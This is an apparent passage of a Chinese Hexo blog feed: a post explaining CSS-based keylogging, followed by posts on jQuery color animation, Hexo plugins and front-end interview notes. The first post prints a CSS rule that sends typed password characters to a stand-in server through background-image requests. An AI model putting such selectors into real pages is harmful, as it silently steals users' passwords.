    <content type="html"><![CDATA[<h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><pre><code>input[type=&quot;password&quot;][value$=&quot;1&quot;] { background-image: url(&quot;http://localhost:3000/1&quot;); }</code></pre><p>解释如下：</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" srcset="undefined" alt="code"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于jQuery中“animate()”函数对颜色变化的支持</title>
    <link href="undefined2019/12/01/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/"/>
    <url>2019/12/01/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<p>我要做得就是让下面一段代码生效：</p><pre><code class="javascript">$(&quot;#yourid&quot;).stop().animate({ &quot;backgroundColor&quot; : &quot;#rrggbb&quot;, &quot;color&quot; : &quot;#rrggbb&quot; }, &quot;fast&quot;);</code></pre><p>　　但是，很遗憾，一点也没有动。本来效果应该跟这个版本的xcoder博客的天头导航条一样有个动态效果（只不过xcoder的导航条是透明度变化，而项目中我想让它背景色变化）。</p><p>　　原因是什么呢？死月上网查了很久，找到的东西都很简单地说明了一下，貌似都可以。嘛，也许是jQuery新版本不支持这个特性了吧。</p><p>　　最后，死月在jQuery的官方文档中找到了下面这段话——</p><blockquote><p>All animated properties should be animated to <strong><em>a single numeric value\</em></strong>, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the <a href="https://github.com/jquery/jquery-color" target="_blank" rel="noopener">jQuery.Color()</a> plugin is used). Property values are treated as a number of pixels unless otherwise specified. The units em and % can be specified where applicable.</p><p>—— <a href="http://api.jquery.com/animate/" target="_blank" rel="noopener">jQuery官方文档 .animate()</a></p></blockquote><p>　　大致的意思就是说所有动画属性都必须是一个单数字值，所以说大多数非数字的属性是不能被动画化的。例如高度、宽度等可以被动画化，但是背景色就不信了。<strong><em>除非你用了jQuery.Color()插件\</em></strong>。</p><p>　　所以说问题找到了，我们必须得用一个jQuery.Color()插件来对一些颜色进行动画操作。</p><p>　　话不多说，我们去下一个jQuery.Color()插件。把它加在我们的页面中，然后就可以用如下方式来进行动画操作了：</p><pre><code class="javascript">$(this).stop().animate({    &quot;backgroundColor&quot; : jQuery.Color(&quot;rrggbb&quot;),    &quot;color&quot; : jQuery.Color(&quot;rrggbb&quot;)}, &quot;fast&quot;);</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客常用插件及用法</title>
    <link href="undefined2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8F%8A%E7%94%A8%E6%B3%95/"/>
    <url>2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8F%8A%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="hexo-autonofollow"><a href="#hexo-autonofollow" class="headerlink" title="hexo-autonofollow"></a>hexo-autonofollow</h2><p>Github：<a href="https://github.com/liuzc/hexo-autonofollow" target="_blank" rel="noopener">https://github.com/liuzc/hexo-autonofollow</a></p><p>简介：自动为站外链接添加nofollow属性</p><p>安装：</p><pre><code>$ npm install hexo-autonofollow --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>nofollow:  enable: true  exclude:    - exclude1.com    - exclude2.com</code></pre><ul><li><strong>enable</strong> - 是否启用</li><li><strong>exclude</strong> - 排除域名</li></ul><h2 id="hexo-baidu-url-submit"><a href="#hexo-baidu-url-submit" class="headerlink" title="hexo-baidu-url-submit"></a>hexo-baidu-url-submit</h2><p>Github：<a href="https://github.com/huiwang/hexo-baidu-url-submit" target="_blank" rel="noopener">https://github.com/huiwang/hexo-baidu-url-submit</a></p><p>简介：主动推送Hexo博客新链接至百度搜索引擎，解决百度爬虫被禁止访问的问题，提升网站收录质量和速度。</p><p>安装：</p><pre><code>$ npm install hexo-baidu-url-submit --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>baidu_url_submit:  count: 1 ## 提交最新的一个链接  host: blog.cofess.com ## 在百度站长平台中注册的域名  token: your_token ## 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!  path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里</code></pre><ul><li><strong>token</strong> - 您得注册百度站长工具，然后在<strong>工具-&gt;网页抓取-&gt;链接提交</strong>里找到你的密匙。</li></ul><p>其次，_config.ym文件中url的值， 必须是百度站长平台注册的域名， 比如:</p><pre><code># URLurl: blog.cofess.comroot: /permalink: :year/:month/:day/:title/</code></pre><p>最后，加入新的deployer:</p><pre><code>deploy:- type: baidu_url_submitter</code></pre><p>执行<code>hexo deploy</code>的时候，新的链接就会被推送百度了。</p><h2 id="hexo-generator-feed"><a href="#hexo-generator-feed" class="headerlink" title="hexo-generator-feed"></a>hexo-generator-feed</h2><p>Github：<a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">https://github.com/hexojs/hexo-generator-feed</a></p><p>简介：RSS的生成插件，你可以在配置显示你站点的RSS，文件路径\atom.xml。</p><p>安装：</p><pre><code>$ npm install hexo-generator-feed --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>feed:  type: atom  path: atom.xml  limit: 20  hub:  content:</code></pre><ul><li><strong>type</strong> - Feed type. (atom/rss2)</li><li><strong>path</strong> - Feed path. (Default: atom.xml/rss2.xml)</li><li><strong>limit</strong> - Maximum number of posts in the feed (Use <code>0</code> or <code>false</code> to show all posts)</li><li><strong>hub</strong> - URL of the PubSubHubbub hubs (Leave it empty if you don’t use it)</li><li><strong>content</strong> - (optional) set to ‘true’ to include the contents of the entire post in the feed.</li></ul><h2 id="hexo-generator-sitemap"><a href="#hexo-generator-sitemap" class="headerlink" title="hexo-generator-sitemap"></a>hexo-generator-sitemap</h2><p>Github：<a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">https://github.com/hexojs/hexo-generator-sitemap</a></p><p>简介：生成博客的sitemap。</p><p>安装：</p><pre><code>$ npm install hexo-generator-sitemap --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>sitemap:    path: sitemap.xml</code></pre><h2 id="hexo-generator-baidu-sitemap"><a href="#hexo-generator-baidu-sitemap" class="headerlink" title="hexo-generator-baidu-sitemap"></a>hexo-generator-baidu-sitemap</h2><p>Github：<a href="https://github.com/coneycode/hexo-generator-baidu-sitemap" target="_blank" rel="noopener">https://github.com/coneycode/hexo-generator-baidu-sitemap</a></p><p>简介：生成博客的sitemap（针对百度）。</p><p>安装：</p><pre><code>$ npm install hexo-generator-baidu-sitemap --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>baidusitemap:path: baidusitemap.xml</code></pre><h2 id="hexo-generator-json-content"><a href="#hexo-generator-json-content" class="headerlink" title="hexo-generator-json-content"></a>hexo-generator-json-content</h2><p>Github：<a href="https://github.com/alexbruno/hexo-generator-json-content" target="_blank" rel="noopener">https://github.com/alexbruno/hexo-generator-json-content</a></p><p>简介：用于生成静态站点数据，提供搜索功能的数据源。</p><p>安装：</p><pre><code>$ npm install hexo-generator-json-content --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>jsonContent:  ignore:    - path/to/a/page    - url/to/one/post    - an-entire-category    - specific.file    - .ext # a file extension</code></pre><h2 id="hexo-neat"><a href="#hexo-neat" class="headerlink" title="hexo-neat"></a>hexo-neat</h2><p>Github：<a href="https://github.com/rozbo/hexo-neat" target="_blank" rel="noopener">https://github.com/rozbo/hexo-neat</a></p><p>简介：自动压缩html、css、js代码</p><p>安装：</p><pre><code>$ npm install hexo-neat --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>neat_enable: true</code></pre><p>压缩html代码</p><pre><code>neat_html:  enable: true  exclude:</code></pre><p>压缩CSS</p><pre><code>neat_css:  enable: true  exclude:    - &#39;*.min.css&#39;</code></pre><p>压缩JS</p><pre><code>neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - &#39;*.min.js&#39;</code></pre><h2 id="hexo-translate-title"><a href="#hexo-translate-title" class="headerlink" title="hexo-translate-title"></a>hexo-translate-title</h2><p>Github：<a href="https://github.com/cometlj/hexo-translate-title" target="_blank" rel="noopener">https://github.com/cometlj/hexo-translate-title</a></p><p>简介：使用Google翻译，百度翻译和有道翻译将Hexo文章中的汉字标题转成英文标题</p><p>安装：</p><pre><code>$ npm install hexo-translate-title --save</code></pre><p>配置：</p><p>在博客配置文件<code>_config.yml</code>中添加</p><pre><code>translate_title:  translate_way: google    #google | baidu | youdao  youdao_api_key: XXX  youdao_keyfrom: XXX  is_need_proxy: true     #true | false  proxy_url: http://localhost:4000</code></pre><p><strong>注意</strong>：判断是否需要配置google本地代理，如果没有被墙，请将<code>_config.yml</code>下的<code>is_need_proxy: true</code>改为false。如果设置为true,请设置本地代理地址</p><h2 id="hexo-wordcount"><a href="#hexo-wordcount" class="headerlink" title="hexo-wordcount"></a>hexo-wordcount</h2><p>Github：<a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">https://github.com/willin/hexo-wordcount</a></p><p>简介：为文章添加文章字数统计、文章预计阅读时间</p><p>安装：</p><pre><code>$ npm install hexo-wordcount --save</code></pre><p>使用：</p><p>通过以上安装后，你可以在你的模板文件加入以下相关的标签实现本插件的功能<br><strong>字数统计:</strong>WordCount<br><strong>阅读时长预计:</strong>Min2Read<br><strong>总字数统计:</strong> TotalCount</p><h2 id="hexo-generator-restful"><a href="#hexo-generator-restful" class="headerlink" title="hexo-generator-restful"></a>hexo-generator-restful</h2><p>Github：<a href="https://github.com/yscoder/hexo-generator-restful" target="_blank" rel="noopener">https://github.com/yscoder/hexo-generator-restful</a></p><p>简介：RESTful JSON数据生成插件。</p><p>安装：</p><pre><code>$ npm install hexo-generator-restful --save</code></pre><p>配置：</p><p>以下为默认配置，属性值为 <code>false</code> 表示不生成。</p><pre><code>restful:  # site 可配置为数组选择性生成某些属性  # site: [&#39;title&#39;, &#39;subtitle&#39;, &#39;description&#39;, &#39;author&#39;, &#39;since&#39;, email&#39;, &#39;favicon&#39;, &#39;avatar&#39;]  site: true        # hexo.config mix theme.config  posts_size: 10    # 文章列表分页，0 表示不分页  posts_props:      # 文章列表项的需要生成的属性    title: true    slug: true    date: true    updated: true    comments: true    path: true    excerpt: false    cover: true      # 封面图，取文章第一张图片    content: false    keywords: false    categories: true    tags: true  categories: true  # 分类数据  tags: true        # 标签数据  post: true        # 文章数据  pages: false      # 额外的 Hexo 页面数据, 如 About</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>面试要点整理</title>
    <link href="undefined2019/12/01/%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/"/>
    <url>2019/12/01/%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<ol><li>http相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#https" target="_blank" rel="noopener">https</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http2-0" target="_blank" rel="noopener">http2.0</a></li><li>http三次握手和四次挥手<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#三次握手" target="_blank" rel="noopener">三次握手</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#四次挥手" target="_blank" rel="noopener">四次挥手</a></li></ol></li><li>常见的http头<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#请求头：" target="_blank" rel="noopener">请求头：</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#响应头" target="_blank" rel="noopener">响应头</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#常见的http代码" target="_blank" rel="noopener">常见的http代码</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http方法" target="_blank" rel="noopener">http方法</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#浏览器输入url到最终显示过程" target="_blank" rel="noopener">浏览器输入url到最终显示过程</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#get请求和post请求的区别" target="_blank" rel="noopener">get请求和post请求的区别</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器主动推送" target="_blank" rel="noopener">服务器主动推送</a></li></ol></li><li>ajax相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#ajax的优点" target="_blank" rel="noopener">ajax的优点</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#ajax的缺点" target="_blank" rel="noopener">ajax的缺点</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xml和json的比较" target="_blank" rel="noopener">xml和json的比较</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js解析json的方法" target="_blank" rel="noopener">js解析json的方法</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xmlhttprequest的readystate取值" target="_blank" rel="noopener">xmlhttprequest的readystate取值</a></li></ol></li><li>web安全相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#csrf" target="_blank" rel="noopener">csrf</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#xss" target="_blank" rel="noopener">xss</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#clickjacking" target="_blank" rel="noopener">clickjacking</a></li></ol></li><li>性能优化<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#内容优化" target="_blank" rel="noopener">内容优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器优化" target="_blank" rel="noopener">服务器优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js优化" target="_blank" rel="noopener">js优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#css优化" target="_blank" rel="noopener">css优化</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#图片优化" target="_blank" rel="noopener">图片优化</a></li></ol></li><li>vue相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#mvvm和mvc" target="_blank" rel="noopener">mvvm和mvc</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue双向数据绑定" target="_blank" rel="noopener">vue双向数据绑定</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue生命周期" target="_blank" rel="noopener">vue生命周期</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue组件通信" target="_blank" rel="noopener">vue组件通信</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vuex的作用" target="_blank" rel="noopener">vuex的作用</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#vue1-0和vue2-0的区别是什么" target="_blank" rel="noopener">vue1.0和vue2.0的区别是什么</a></li></ol></li><li>js相关<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#数据类型" target="_blank" rel="noopener">数据类型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#判断数据类型" target="_blank" rel="noopener">判断数据类型</a></li><li>高级函数<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#惰性载入函数" target="_blank" rel="noopener">惰性载入函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#安全的类型检测" target="_blank" rel="noopener">安全的类型检测</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#作用域安全的构造函数" target="_blank" rel="noopener">作用域安全的构造函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#函数柯里化" target="_blank" rel="noopener">函数柯里化</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#判断数组" target="_blank" rel="noopener">判断数组</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#箭头函数和this" target="_blank" rel="noopener">箭头函数和this</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#this指向" target="_blank" rel="noopener">this指向</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#作用域" target="_blank" rel="noopener">作用域</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#词法分析" target="_blank" rel="noopener">词法分析</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#构造函数" target="_blank" rel="noopener">构造函数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#new的操作" target="_blank" rel="noopener">new的操作</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#promise和async-await" target="_blank" rel="noopener">promise和async/await</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#闭包" target="_blank" rel="noopener">闭包</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js对象私有变量" target="_blank" rel="noopener">js对象私有变量</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js垃圾回收机制" target="_blank" rel="noopener">js垃圾回收机制</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#原型链" target="_blank" rel="noopener">原型链</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#rhs和lhs" target="_blank" rel="noopener">rhs和lhs</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#EventLoop" target="_blank" rel="noopener">EventLoop</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#WebSocket" target="_blank" rel="noopener">WebSocket</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#继承" target="_blank" rel="noopener">继承</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#创建对象" target="_blank" rel="noopener">创建对象</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js跨域" target="_blank" rel="noopener">js跨域</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#服务器推送" target="_blank" rel="noopener">服务器推送</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#多页面传参数" target="_blank" rel="noopener">多页面传参数</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#深拷贝和浅拷贝" target="_blank" rel="noopener">深拷贝和浅拷贝</a></li><li>js事件模型<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM0级模型" target="_blank" rel="noopener">DOM0级模型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM2级模型" target="_blank" rel="noopener">DOM2级模型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#IE事件模型" target="_blank" rel="noopener">IE事件模型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM事件模型和IE事件模型的区别" target="_blank" rel="noopener">DOM事件模型和IE事件模型的区别</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#严格模式" target="_blank" rel="noopener">严格模式</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js模块化" target="_blank" rel="noopener">js模块化</a></li></ol></li><li>缓存和离线存储<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http缓存" target="_blank" rel="noopener">http缓存</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#session-cookie-localStorage-sessionStorage" target="_blank" rel="noopener">session cookie localStorage sessionStorage</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#manifest" target="_blank" rel="noopener">manifest</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http缓存机制" target="_blank" rel="noopener">http缓存机制</a></li></ol></li></ol><h2 id="http相关"><a href="#http相关" class="headerlink" title="http相关"></a>http相关</h2><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>Https可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，即HTTP-SSL-TCP-IP,HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输.目前使用最广泛的是TLS 1.1、TLS 1.2。<br>HTTP面临的风险有：</p><ul><li>窃听风险</li><li>篡改风险</li><li>冒充风险</li></ul><p><img src="https://pic2.zhimg.com/80/v2-5e2241fae8b593ff7f3b3a308ef81c10_hd.jpg" srcset="undefined" alt="img"></p><h3 id="http2-0"><a href="#http2-0" class="headerlink" title="http2.0"></a>http2.0</h3><p>当前使用的协议是http1.1,http2.0(RFC 7540)需要现代浏览器和web服务器的支持，其发展于SPDY。<br>其特点有：</p><ul><li>二进制分帧</li><li>压缩头部</li><li>多路复用（请求优先级）</li><li>服务器推送</li></ul><h3 id="http三次握手和四次挥手"><a href="#http三次握手和四次挥手" class="headerlink" title="http三次握手和四次挥手"></a>http三次握手和四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>第一次握手：主机A发送位码为syn＝1,随机产生seq number=x的数据包到服务器，客户端进入SYN_SEND状态，等待服务器的确认；主机B由SYN=1知道，A要求建立联机；</p><p>第二次握手：主机B收到请求后要确认联机信息，向A发送ack number(主机A的seq+1),syn=1,ack=1,随机产生seq=y的包,此时服务器进入SYN_RECV状态;</p><p>第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1,以及位码ack是否为1，若正确，主机A会再发送ack number(主机B的seq+1),ack=1，主机B收到后确认seq值与ack=1则连接建立成功。客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；</p><p>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我也没有数据要发送了，可以进行关闭连接了；</p><p>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入CLOSE_WAIT状态；</p><p>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。</p><h3 id="常见的http头"><a href="#常见的http头" class="headerlink" title="常见的http头"></a>常见的http头</h3><h4 id="请求头："><a href="#请求头：" class="headerlink" title="请求头："></a>请求头：</h4><ul><li>Accept：接受的响应内容类型： text/plain</li><li>Cache-Control：是否使用缓存机制：no-cache</li><li>Origin：用于cors判断请求来源</li><li>Referer：访问的前一个页面</li><li>User-Agent：浏览器标识字符串</li></ul><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><ul><li>Allow：允许的http方法</li><li>Content-Encoding：响应资源所使用的编码类型</li><li>ETag：资源版本的标识符</li><li>Expires：过期时间</li><li>Set-Cookie：设定cookie值</li></ul><h3 id="常见的http代码"><a href="#常见的http代码" class="headerlink" title="常见的http代码"></a>常见的http代码</h3><ul><li>1xx：临时响应</li><li>2xx：成功</li><li>3xx：重定向</li><li>4xx：客户端错误</li><li>5xx：服务器错误</li></ul><p>常见代码：</p><ul><li>301:永久移动</li><li>302：临时移动</li><li>304:未修改</li><li>400:不理解请求的语法</li><li>401:未授权</li><li>403:拒绝请求</li><li>405:不支持http方法</li><li>503:现在无法提供服务</li></ul><h3 id="http方法"><a href="#http方法" class="headerlink" title="http方法"></a>http方法</h3><ul><li>GET：获取资源</li><li>HEAD：获取报头</li><li>PUT：更新资源</li><li>POST：提交数据、新建资源</li><li>TRACE：检查http在过程中的变更</li><li>OPTIONS：返回支持的http方法</li><li>DELETE：删除页面</li><li>拓展方法如MOVE、COPY等</li></ul><h3 id="浏览器输入url到最终显示过程"><a href="#浏览器输入url到最终显示过程" class="headerlink" title="浏览器输入url到最终显示过程"></a>浏览器输入url到最终显示过程</h3><ul><li>DNS解析</li><li>TCP连接</li><li>发送HTTP请求</li><li>服务器处理请求并返回HTTP报文</li><li>浏览器解析渲染页面</li><li>连接结束</li></ul><h3 id="get请求和post请求的区别"><a href="#get请求和post请求的区别" class="headerlink" title="get请求和post请求的区别"></a>get请求和post请求的区别</h3><ul><li>get请求url长度受限制：url最大长度是2048个字符</li><li>get请求只能传输ascii字符</li><li>get请求可以显示在url中，所以安全性较差</li></ul><h3 id="服务器主动推送"><a href="#服务器主动推送" class="headerlink" title="服务器主动推送"></a>服务器主动推送</h3><ul><li>ajax轮询</li><li>Comet</li><li>Server-Sent</li><li>WebSocket</li></ul><h2 id="ajax相关"><a href="#ajax相关" class="headerlink" title="ajax相关"></a>ajax相关</h2><h3 id="ajax的优点"><a href="#ajax的优点" class="headerlink" title="ajax的优点"></a>ajax的优点</h3><ul><li>异步加载，优化用户体验</li><li>减少了与服务器之间不必要的传输</li><li>实现局部刷新</li><li>把服务器的负担转移到客户端</li></ul><h3 id="ajax的缺点"><a href="#ajax的缺点" class="headerlink" title="ajax的缺点"></a>ajax的缺点</h3><ul><li>不支持浏览器的历史记录</li><li>对搜索引擎的支持差</li></ul><h3 id="xml和json的比较"><a href="#xml和json的比较" class="headerlink" title="xml和json的比较"></a>xml和json的比较</h3><ul><li>xml解码难度大，json是js的子集，解析容易</li><li>xml占据了较早的市场</li><li>xml数据描述性更好</li><li>json体积小，传输速度快</li></ul><h3 id="js解析json的方法"><a href="#js解析json的方法" class="headerlink" title="js解析json的方法"></a>js解析json的方法</h3><ul><li>eval</li><li>new Function</li><li>JSON.parse</li></ul><h3 id="xmlhttprequest的readystate取值"><a href="#xmlhttprequest的readystate取值" class="headerlink" title="xmlhttprequest的readystate取值"></a>xmlhttprequest的readystate取值</h3><p>readyState属性 请求的状态 有5个可取值0=未初始化 ，1=正在加载，2=已加载，3=交互中，4=完成</p><h2 id="web安全相关"><a href="#web安全相关" class="headerlink" title="web安全相关"></a>web安全相关</h2><h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>csrf：跨站请求伪造。借助用户本地存储的cookie进行恶意的请求伪造。解决方案是检查其http-refer和制作token在请求中一并发送。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>xss：跨站脚本攻击。攻击者将恶意的js代码插入到页面中。分为基于反射的，基于存储的，基于dom的。解决方案是通过检查过滤用户输入的数据。</p><h3 id="clickjacking"><a href="#clickjacking" class="headerlink" title="clickjacking"></a>clickjacking</h3><p>clickjacking：设置iframe指向其他网站并且将其设置为透明，诱骗用户填入信息并触发请求。解决方案为在响应头中设置X-Frame-Options，可选为3个DENY、SAMEORIGIN、ALLOW-FROM。</p><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="内容优化"><a href="#内容优化" class="headerlink" 